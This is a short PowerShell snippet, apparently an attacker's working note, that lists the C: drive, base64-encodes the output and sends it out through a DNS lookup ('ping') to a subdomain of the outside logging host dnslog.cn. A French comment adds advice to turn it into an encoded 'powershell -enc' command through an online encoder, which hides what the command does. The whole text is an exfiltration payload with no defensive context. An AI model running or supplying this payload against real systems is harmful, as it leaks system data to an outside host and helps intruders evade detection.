$test = dir c:\ 2>&1 ;
$EncBytes = [System.Text.Encoding]::UTF8.GetBytes($test);
$Enc = [System.Convert]::ToBase64String($EncBytes) ;
$Encf =  "$Enc" -replace '=' ;
$Encfi = -join $Encf[0..60] ;
ping "$Encfi.truc.dnslog.cn"

#into https://raikia.com/tool-powershell-encoder/ pour avoir une commande type powershell -enc b64
